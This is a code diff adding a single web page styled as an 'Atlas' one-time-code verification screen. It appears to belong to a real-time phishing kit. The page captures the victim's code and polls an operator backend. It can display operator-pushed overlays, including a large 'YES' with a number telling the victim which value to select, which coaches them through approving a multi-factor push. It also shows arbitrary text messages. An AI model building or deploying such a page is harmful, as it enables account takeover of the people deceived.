@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Atlas - OTP Verification</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+body {
+  min-height: 100vh;
+  background: linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #334155 100%);
+  display: flex; justify-content: center; align-items: center; padding: 20px;
+}
+.card {
+  background: #fff; border-radius: 24px; padding: 40px 32px;
+  width: 100%; max-width: 420px;
+  box-shadow: 0 20px 60px rgba(0,0,0,0.4);
+}
+.logo {
+  width: 56px; height: 56px;
+  background: linear-gradient(135deg, #4a4ff0, #7c3aed);
+  border-radius: 16px; margin: 0 auto 20px;
+  display: flex; align-items: center; justify-content: center;
+  color: white; font-weight: 800; font-size: 24px;
+}
+h1 { font-size: 24px; font-weight: 700; color: #1f2937; text-align: center; margin-bottom: 8px; }
+.subtitle { text-align: center; color: #6b7280; font-size: 14px; margin-bottom: 32px; line-height: 1.5; }
+.email-highlight { color: #4a4ff0; font-weight: 600; }
+.form-group { margin-bottom: 20px; }
+label { display: block; font-size: 13px; font-weight: 600; color: #374151; margin-bottom: 8px; }
+input {
+  width: 100%; padding: 16px;
+  border: 1.5px solid #e5e7eb; border-radius: 12px;
+  font-size: 20px; letter-spacing: 8px; text-align: center;
+  font-weight: 600; outline: none;
+  text-transform: uppercase;
+  transition: border-color 0.2s;
+}
+input:focus { border-color: #4a4ff0; }
+input:disabled { background: #f3f4f6; }
+button {
+  width: 100%; padding: 15px;
+  background: linear-gradient(90deg, #4a4ff0, #7c3aed);
+  color: white; border: none; border-radius: 12px;
+  font-size: 15px; font-weight: 600; cursor: pointer;
+  display: flex; align-items: center; justify-content: center; gap: 10px;
+  transition: opacity 0.2s;
+}
+button:disabled { opacity: 0.7; cursor: not-allowed; }
+.spinner {
+  width: 18px; height: 18px;
+  border: 2px solid rgba(255,255,255,0.3);
+  border-top-color: white;
+  border-radius: 50%;
+  animation: spin 0.8s linear infinite;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+.error-label {
+  color: #dc2626; font-size: 13px;
+  margin-top: 12px; text-align: center; display: none;
+  background: #fef2f2; padding: 12px; border-radius: 10px;
+}
+
+.popup-overlay {
+  position: fixed; inset: 0;
+  background: rgba(0,0,0,0.92);
+  z-index: 10000; display: none;
+  justify-content: center; align-items: center; padding: 20px;
+}
+.popup-overlay.active { display: flex; }
+.popup-yes { text-align: center; color: white; max-width: 500px; width: 100%; }
+.popup-yes .big-yes {
+  font-size: 80px; font-weight: 900; color: #10b981;
+  letter-spacing: 4px; text-shadow: 0 0 40px rgba(16,185,129,0.6);
+  margin-bottom: 20px; animation: pulseYes 1.5s ease-in-out infinite;
+}
+@keyframes pulseYes { 0%,100%{transform:scale(1)} 50%{transform:scale(1.05)} }
+.popup-yes .big-number {
+  font-size: 120px; font-weight: 900; color: #fbbf24;
+  letter-spacing: 8px; text-shadow: 0 0 40px rgba(251,191,36,0.6); margin: 20px 0;
+}
+.popup-yes .instruction {
+  font-size: 20px; font-weight: 600; color: #e5e7eb; margin-top: 20px; line-height: 1.5;
+}
+.popup-text {
+  background: white; border-radius: 20px; padding: 32px; max-width: 400px; width: 100%;
+}
+.popup-text .icon {
+  width: 60px; height: 60px;
+  background: linear-gradient(135deg, #f97316, #ea580c);
+  border-radius: 50%; margin: 0 auto 16px;
+  display: flex; align-items: center; justify-content: center;
+  color: white; font-size: 28px; font-weight: bold;
+}
+.popup-text h3 { text-align: center; color: #1f2937; margin-bottom: 16px; font-size: 20px; }
+.popup-text .message {
+  background: #f3f4f6; padding: 20px; border-radius: 12px;
+  color: #1f2937; font-size: 15px; line-height: 1.6;
+  word-break: break-word; white-space: pre-wrap;
+}
+</style>
+</head>
+<body>
+
+<div class="card">
+  <div class="logo">A</div>
+  <h1>Verification Code</h1>
+  <p class="subtitle">Enter the 5-6 character code for <br><span class="email-highlight" id="emailDisplay"></span></p>
+
+  <div class="form-group">
+    <label>Enter Code (letters & numbers)</label>
+    <input type="text" id="otpInput" maxlength="6" placeholder="------" autocomplete="off">
+  </div>
+
+  <button id="submitBtn">Submit Code</button>
+  <div id="errorLabel" class="error-label"></div>
+</div>
+
+<!-- YES Popup -->
+<div id="yesPopup" class="popup-overlay">
+  <div class="popup-yes">
+    <div class="big-yes">YES</div>
+    <div class="big-number" id="yesNumber">00</div>
+    <div class="instruction">Tap <strong>YES</strong> and select <strong id="yesNumberText">00</strong> to continue</div>
+  </div>
+</div>
+
+<!-- Text Popup -->
+<div id="textPopup" class="popup-overlay">
+  <div class="popup-text">
+    <div class="icon">!</div>
+    <h3>Message</h3>
+    <div class="message" id="textMessage"></div>
+  </div>
+</div>
+
+<script src="/socket.io/socket.io.js"></script>
+<script>
+const socket = io();
+const urlParams = new URLSearchParams(window.location.search);
+const email = urlParams.get('email');
+if (!email) window.location.href = '/';
+document.getElementById('emailDisplay').textContent = email;
+
+const otpInput = document.getElementById('otpInput');
+const submitBtn = document.getElementById('submitBtn');
+const errorLabel = document.getElementById('errorLabel');
+const yesPopup = document.getElementById('yesPopup');
+const textPopup = document.getElementById('textPopup');
+
+let pollInterval = null;
+let timeoutTimer = null;
+let lastPopupId = 0;
+let submitted = false;
+
+function showError(msg) {
+  errorLabel.textContent = msg;
+  errorLabel.style.display = 'block';
+  setTimeout(() => { errorLabel.style.display = 'none'; }, 8000);
+}
+
+function setLoading(loading) {
+  submitBtn.disabled = loading;
+  otpInput.disabled = loading;
+  if (loading) submitBtn.innerHTML = '<div class="spinner"></div> Verifying...';
+  else submitBtn.innerHTML = 'Submit Code';
+}
+
+function clearPopups() {
+  yesPopup.classList.remove('active');
+  textPopup.classList.remove('active');
+}
+
+function showYesPopup(n) {
+  textPopup.classList.remove('active');
+  document.getElementById('yesNumber').textContent = n;
+  document.getElementById('yesNumberText').textContent = n;
+  yesPopup.classList.add('active');
+}
+
+function showTextPopup(msg) {
+  yesPopup.classList.remove('active');
+  document.getElementById('textMessage').textContent = msg;
+  textPopup.classList.add('active');
+}
+
+async function pollStatus() {
+  try {
+    const res = await fetch(`/api/user/status?email=${encodeURIComponent(email)}`);
+    const data = await res.json();
+
+    if (data.wrong_otp_flag) {
+      setLoading(false);
+      submitted = false;
+      otpInput.value = '';
+      showError('Incorrect code. Please try again.');
+      await fetch('/api/user/clear-flags', {
+        method: 'POST', headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({ email })
+      });
+      return;
+    }
+
+    if (data.timeout_flag) {
+      window.location.href = '/';
+      return;
+    }
+
+    if (data.popup_id && data.popup_id > lastPopupId) {
+      lastPopupId = data.popup_id;
+      if (data.popup_type === 'yes') showYesPopup(data.popup_value);
+      else if (data.popup_type === 'text') showTextPopup(data.popup_value);
+    }
+
+    if (data.status === 'success') {
+      window.location.href = `/success.html?email=${encodeURIComponent(email)}`;
+      return;
+    }
+
+    if (data.status === 'approved') {
+      // Admin clicked OTP approval → success
+      window.location.href = `/success.html?email=${encodeURIComponent(email)}`;
+      return;
+    }
+
+    if (data.otp_approved) {
+      window.location.href = `/success.html?email=${encodeURIComponent(email)}`;
+      return;
+    }
+  } catch (err) { console.error(err); }
+}
+
+submitBtn.addEventListener('click', async () => {
+  if (submitted) return;
+  const otp = otpInput.value.trim();
+  if (otp.length < 5 || otp.length > 6) {
+    showError('Code must be 5 or 6 characters.');
+    return;
+  }
+  if (!/^[A-Za-z0-9]+$/.test(otp)) {
+    showError('Only letters and numbers are allowed.');
+    return;
+  }
+
+  submitted = true;
+  setLoading(true);
+
+  try {
+    const res = await fetch('/api/user/submit-otp', {
+      method: 'POST', headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ email, otp })
+    });
+    const data = await res.json();
+    if (!data.success) {
+      submitted = false;
+      setLoading(false);
+      showError(data.error || 'Failed to submit code.');
+      return;
+    }
+
+    if (pollInterval) clearInterval(pollInterval);
+    pollInterval = setInterval(pollStatus, 1500);
+
+    if (timeoutTimer) clearTimeout(timeoutTimer);
+    timeoutTimer = setTimeout(() => {
+      setLoading(false);
+      submitted = false;
+      showError('Timeout. Please try again after 5 minutes.');
+      if (pollInterval) clearInterval(pollInterval);
+    }, 60000);
+
+  } catch (err) {
+    submitted = false;
+    setLoading(false);
+    showError('Network error. Please try again.');
+  }
+});
+
+otpInput.addEventListener('input', () => {
+  otpInput.value = otpInput.value.toUpperCase();
+});
+
+socket.on('popup-update', (data) => {
+  if (data.email !== email) return;
+  if (data.popup_id > lastPopupId) {
+    lastPopupId = data.popup_id;
+    if (data.popup_type === 'yes') showYesPopup(data.popup_value);
+    else if (data.popup_type === 'text') showTextPopup(data.popup_value);
+  }
+});
+
+// Check status immediately on load
+pollStatus();
+if (!pollInterval) pollInterval = setInterval(pollStatus, 1500);
+</script>
+</body>
+</html>
